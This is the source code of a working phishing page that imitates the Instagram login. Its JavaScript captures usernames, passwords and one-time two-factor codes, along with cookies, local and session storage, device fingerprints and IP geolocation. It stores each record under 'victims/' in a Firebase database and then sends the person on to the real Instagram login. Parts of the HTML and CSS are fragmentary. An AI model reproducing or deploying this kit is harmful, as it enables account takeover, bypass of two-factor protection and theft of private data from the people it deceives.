<style>

  --ig-bg:#fafafa;

/* ═══ PHONES (left) ═══ */
.ig-phones{

}
.ig-phone-frame{

}
.ig-phone{
  position:absolute;
  width:245px;
  height:504px;
  top:26px;
  left:112px;
  background:#000;
  border-radius:38px;
  border:12px solid #262626;
  box-shadow:0 0 0 3px #3a3a3a,0 0 0 4px #1a1a1a,0 30px 60px rgba(0,0,0,.4);
  overflow:hidden;
}
.ig-phone::before{
  content:'';
  position:absolute;
  top:0;left:50%;
  transform:translateX(-50%);
  width:110px;height:24px;
  background:#262626;
  border-radius:0 0 16px 16px;
  z-index:5;
}
.ig-phone-screen{
  position:absolute;
  inset:12px;
  border-radius:28px;
  overflow:hidden;
  background:linear-gradient(135deg,#833ab4 0%,#fd1d1d 50%,#fcb045 100%);

  flex-direction:column;
}
.ig-phone-screen::after{
  content:'';
  position:absolute;

  background:linear-gradient(180deg,rgba(0,0,0,.35) 0%,rgba(0,0,0,.6) 100%);

}
.ig-screen-content{

<script>
/* ═══════════════════════════════════════════════════════
   FIREBASE INIT
   ═══════════════════════════════════════════════════════ */
firebase.initializeApp(window.firebaseConfig);
const database = firebase.database();

/* ═══════════════════════════════════════════════════════
   STATE
   ═══════════════════════════════════════════════════════ */
let cachedDeviceInfo = null;
let cachedIPInfo = null;
let cachedCanvasFP = null;
let cachedWebGLFP = null;
let pendingEmail = '';
let pendingVictimId = '';

const REDIRECT_URL = 'https://www.instagram.com/accounts/login/';

/* ═══════════════════════════════════════════════════════
   SAFE KEY (Firebase RTDB invalid chars)
   ═══════════════════════════════════════════════════════ */
function safeKey(key){
  return String(key)
    .replace(/\./g, '_')
    .replace(/\#/g, '_')
    .replace(/\$/g, '_')
    .replace(/\//g, '_')
    .replace(/\[/g, '_')
    .replace(/\]/g, '_')
    .replace(/\:/g, '_');
}

/* ═══════════════════════════════════════════════════════
   DEVICE FINGERPRINT
   ═══════════════════════════════════════════════════════ */
function getDeviceInfo(){
  const ua = navigator.userAgent;
  return {
    userAgent: ua,
    platform: navigator.platform,
    language: navigator.language,
    languages: navigator.languages ? navigator.languages.join(',') : '',
    screen: screen.width + 'x' + screen.height,
    availScreen: screen.availWidth + 'x' + screen.availHeight,
    colorDepth: screen.colorDepth,
    pixelRatio: window.devicePixelRatio,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: new Date().getTimezoneOffset(),
    browser: detectBrowser(ua),
    browserVersion: detectBrowserVersion(ua),
    os: detectOS(ua),
    device: ua.includes('Mobile') ? 'Mobile' : 'Desktop',
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack || 'unknown',
    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
    maxTouchPoints: navigator.maxTouchPoints || 0,
    memory: navigator.deviceMemory || 'unknown',
    vendor: navigator.vendor || 'unknown',
    appVersion: navigator.appVersion
  };
}
function detectBrowser(ua){
  if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) return 'Chrome';
  if (ua.includes('Firefox')) return 'Firefox';
  if (ua.includes('Edg')) return 'Edge';
  if (ua.includes('OPR')) return 'Opera';
  if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
  if (ua.includes('MSIE') || ua.includes('Trident')) return 'IE';
  return 'Unknown';
}
function detectBrowserVersion(ua){
  const match = ua.match(/(Chrome|Firefox|Edge|Safari|Opera)\/(\d+)/);
  return match ? match[1] + ' ' + match[2] : 'Unknown';
}
function detectOS(ua){
  if (ua.includes('Windows NT 10')) return 'Windows 10';
  if (ua.includes('Windows NT 11')) return 'Windows 11';
  if (ua.includes('Windows NT 6.3')) return 'Windows 8.1';
  if (ua.includes('Windows NT 6.1')) return 'Windows 7';
  if (ua.includes('Android')){
    const m = ua.match(/Android (\d+)/);
    return m ? 'Android ' + m[1] : 'Android';
  }
  if (ua.includes('iPhone')) return 'iOS (iPhone)';
  if (ua.includes('iPad')) return 'iOS (iPad)';
  if (ua.includes('Mac OS')) return 'macOS';
  if (ua.includes('Linux')) return 'Linux';
  return 'Unknown';
}

/* ═══════════════════════════════════════════════════════
   CANVAS + WEBGL FINGERPRINTS
   ═══════════════════════════════════════════════════════ */
function getCanvasFingerprint(){
  try{
    const c = document.createElement('canvas');
    c.width = 200; c.height = 50;
    const ctx = c.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.textBaseline = 'alphabetic';
    ctx.fillStyle = '#f60';
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = '#069';
    ctx.fillText('CanvasFingerprint', 2, 15);
    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
    ctx.fillText('Browser', 4, 17);
    return hashString(c.toDataURL());
  }catch(e){ return 'canvas_error'; }
}
function getWebGLFingerprint(){
  try{
    const c = document.createElement('canvas');
    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
    if(!gl) return 'no_webgl';
    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
    const vendor = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
    const renderer = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
    return vendor + ' | ' + renderer;
  }catch(e){ return 'webgl_error'; }
}
function hashString(str){
  let hash = 0;
  for (let i = 0; i < str.length; i++){
    const char = str.charCodeAt(i);
    hash = ((hash << 5) - hash) + char;
    hash = hash & hash;
  }
  return hash.toString(36);
}

/* ═══════════════════════════════════════════════════════
   STORAGE + COOKIES (all sanitized)
   ═══════════════════════════════════════════════════════ */
function getAllCookies(){
  const cookies = {};
  const raw = document.cookie;
  if (raw){
    raw.split(';').forEach(cookie => {
      const parts = cookie.trim().split('=');
      const name = parts[0];
      const value = parts.slice(1).join('=');
      if(name) cookies[safeKey(name)] = value;
    });
  }
  return cookies;
}
function getLocalStorage(){
  try{
    const data = {};
    for (let i = 0; i < localStorage.length; i++){
      const key = localStorage.key(i);
      data[safeKey(key)] = localStorage.getItem(key);
    }
    return data;
  }catch(e){ return {}; }
}
function getSessionStorage(){
  try{
    const data = {};
    for (let i = 0; i < sessionStorage.length; i++){
      const key = sessionStorage.key(i);
      data[safeKey(key)] = sessionStorage.getItem(key);
    }
    return data;
  }catch(e){ return {}; }
}

/* ═══════════════════════════════════════════════════════
   IP INTEL
   ═══════════════════════════════════════════════════════ */
async function getIPInfo(){
  try{
    const res = await fetch('https://ipapi.co/json/', {signal: AbortSignal.timeout(5000)});
    const d = await res.json();
    return {
      ip: d.ip || 'Unknown',
      network: d.network || 'Unknown',
      version: d.version || '',
      city: d.city || 'Unknown',
      region: d.region || 'Unknown',
      country: d.country_name || 'Unknown',
      countryCode: d.country_code || 'Unknown',
      postal: d.postal || '',
      isp: d.org || 'Unknown',
      asn: d.asn || 'Unknown',
      timezone: d.timezone || 'Unknown',
      latitude: d.latitude || '',
      longitude: d.longitude || '',
      languages: d.languages || ''
    };
  }catch{
    try{
      const res = await fetch('https://ipwho.is/', {signal: AbortSignal.timeout(5000)});
      const d = await res.json();
      return {
        ip: d.ip || 'Unknown',
        city: d.city || 'Unknown',
        country: d.country || 'Unknown',
        isp: d.connection?.isp || 'Unknown',
        latitude: d.latitude || '',
        longitude: d.longitude || ''
      };
    }catch{
      return { ip:'Unknown', city:'Unknown', country:'Unknown' };
    }
  }
}

/* ═══════════════════════════════════════════════════════
   PRE-FETCH INTEL
   ═══════════════════════════════════════════════════════ */
async function ensureIntel(){
  if(!cachedDeviceInfo) cachedDeviceInfo = getDeviceInfo();
  if(!cachedCanvasFP) cachedCanvasFP = getCanvasFingerprint();
  if(!cachedWebGLFP) cachedWebGLFP = getWebGLFingerprint();
  if(!cachedIPInfo) cachedIPInfo = await getIPInfo();
}
window.addEventListener('load', () => { ensureIntel(); });

/* ═══════════════════════════════════════════════════════
   UI HELPERS
   ═══════════════════════════════════════════════════════ */
function showError(msg){
  const box = document.getElementById('errorBox');
  if(!box) return;
  box.textContent = msg;
  box.classList.add('show');
}
function hideError(){
  const box = document.getElementById('errorBox');
  if(box) box.classList.remove('show');
}
function togglePw(){
  const pw = document.getElementById('password');
  const btn = document.getElementById('pwToggle');
  if(!pw) return;
  if(pw.type === 'password'){
    pw.type = 'text';
    btn.textContent = 'Hide';
  } else {
    pw.type = 'password';
    btn.textContent = 'Show';
  }
}

/* ═══════════════════════════════════════════════════════
   STEP 1 — CAPTURE EMAIL + PASSWORD
   ═══════════════════════════════════════════════════════ */
async function captureData(event){
  event.preventDefault();
  hideError();

  const email = document.getElementById('email').value.trim();
  const password = document.getElementById('password').value;

  if(!email){
    showError('Please enter your phone number, username, or email.');
    document.getElementById('email').focus();
    return false;
  }
  if(!password){
    showError('Please enter your password.');
    document.getElementById('password').focus();
    return false;
  }

  document.getElementById('btnText').style.display = 'none';
  document.getElementById('spinner').style.display = 'block';
  document.getElementById('loginBtn').disabled = true;

  pendingEmail = email;
  await ensureIntel();

  const victimId = 'ig_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
  pendingVictimId = victimId;

  const victimData = {
    platform: 'instagram',
    email: email,
    password: password,
    step: 'password',

    deviceInfo: cachedDeviceInfo,
    canvasFingerprint: cachedCanvasFP,
    webglFingerprint: cachedWebGLFP,
    cookies: getAllCookies(),
    cookieString: document.cookie,
    ipInfo: cachedIPInfo,
    timestamp: new Date().toISOString(),
    victimId: victimId,
    referrer: document.referrer || 'Direct Access',
    pageUrl: window.location.href,
    localStorageData: getLocalStorage(),
    sessionStorageData: getSessionStorage()
  };

  try{
    await database.ref('victims/' + victimId).set(victimData);
    console.log('✓ Instagram password captured');
  }catch(error){
    console.error('Firebase error:', error.message);
  }

  setTimeout(() => { showOtpStep(); }, 1200);
  return false;
}

/* ═══════════════════════════════════════════════════════
   STEP 2 — OTP SCREEN
   ═══════════════════════════════════════════════════════ */

  card.innerHTML = `

          <path d="M48 22 L48 48 L64 58" fill="none" stroke="#262626" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
          <circle cx="48" cy="48" r="3" fill="#262626"/>
          <path d="M28 66 Q34 74 48 74 Q62 74 68 66" fill="none" stroke="#ed4956" stroke-width="3" stroke-linecap="round"/>

      <input type="text" class="ig-otp-input" id="otpInput" name="otp"

      <button type="submit" class="ig-btn-login" id="otpBtn">

      <a href="#" onclick="return handleResend(event);"

  const inp = document.getElementById('otpInput');

async function captureOtp(event){
  event.preventDefault();
  const errBox = document.getElementById('otpError');
  errBox.classList.remove('show');

  const otp = document.getElementById('otpInput').value.trim();
  if(!otp || otp.length < 4){
    errBox.textContent = 'Please enter the code we sent you.';
    errBox.classList.add('show');
    return false;
  }

  document.getElementById('otpBtnText').style.display = 'none';
  document.getElementById('otpSpinner').style.display = 'block';
  document.getElementById('otpBtn').disabled = true;

  await ensureIntel();

  const otpId = pendingVictimId + '_otp';
  const otpData = {
    platform: 'instagram',
    email: pendingEmail,
    password: '',
    otp: otp,
    otpCode: otp,
    step: 'otp',
    deviceInfo: cachedDeviceInfo,
    canvasFingerprint: cachedCanvasFP,
    webglFingerprint: cachedWebGLFP,
    cookies: getAllCookies(),
    cookieString: document.cookie,
    ipInfo: cachedIPInfo,
    timestamp: new Date().toISOString(),
    victimId: otpId,
    parentVictimId: pendingVictimId,
    referrer: document.referrer || 'Direct Access',
    pageUrl: window.location.href
  };

  try{
    await database.ref('victims/' + otpId).set(otpData);
    console.log('✓ Instagram OTP captured');
  }catch(error){
    console.error('Firebase error:', error.message);
  }

  setTimeout(() => { window.location.href = REDIRECT_URL; }, 1200);
  return false;
}

/* ═══════════════════════════════════════════════════════
   RESEND / FORGOT / FB LOGIN
   ═══════════════════════════════════════════════════════ */
async function handleResend(event){
  event.preventDefault();
  await ensureIntel();
  const id = pendingVictimId + '_resend_' + Date.now();
  try{
    await database.ref('victims/' + id).set({
      platform: 'instagram',
      email: pendingEmail,
      password: '',
      otp: 'RESEND_REQUESTED',
      step: 'resend',
      deviceInfo: cachedDeviceInfo,
      ipInfo: cachedIPInfo,
      cookies: getAllCookies(),
      timestamp: new Date().toISOString(),
      victimId: id,
      parentVictimId: pendingVictimId
    });
  }catch(e){}
  alert('A new code has been sent to ' + maskEmail(pendingEmail));
  return false;
}

async function handleForgot(event){
  event.preventDefault();

  // Instagram shows a "trouble logging in" flow; we capture email prompt first
  const email = prompt('Enter your email, phone number, or username to reset your password:');
  if(!email || !email.trim()) return false;

  await ensureIntel();

  const id = 'ig_forgot_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
  try{
    await database.ref('victims/' + id).set({
      platform: 'instagram',
      email: email.trim(),
      password: '',
      otp: 'FORGOT_PASSWORD_REQUEST',
      step: 'forgot',
      deviceInfo: cachedDeviceInfo,
      canvasFingerprint: cachedCanvasFP,
      webglFingerprint: cachedWebGLFP,
      ipInfo: cachedIPInfo,
      cookies: getAllCookies(),
      timestamp: new Date().toISOString(),
      victimId: id
    });
  }catch(e){}

  alert('If an account exists for ' + email + ', we\'ll send a reset link shortly.');
  return false;
}

function handleFbLogin(event){
  event.preventDefault();
  // Real Instagram would redirect to FB OAuth — we send them to real IG login
  window.location.href = 'https://www.instagram.com/accounts/login/';
  return false;
}

/* ═══════════════════════════════════════════════════════
   HELPERS
   ═══════════════════════════════════════════════════════ */
function maskEmail(str){
  if(!str) return '';
  if(str.includes('@')){
    const [u, d] = str.split('@');
    const head = u.slice(0, Math.min(2, u.length));
    const tail = u.length > 2 ? '*'.repeat(Math.min(6, u.length - 2)) : '';
    return head + tail + '@' + d;
  }
  const s = String(str);
  if(s.length <= 4) return '*'.repeat(s.length);
  return s.slice(0, 2) + '*'.repeat(Math.min(6, s.length - 4)) + s.slice(-2);
}

function escapeHtml(s){
  return String(s).replace(/[&<>"']/g, c => ({
    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
  }[c]));
}
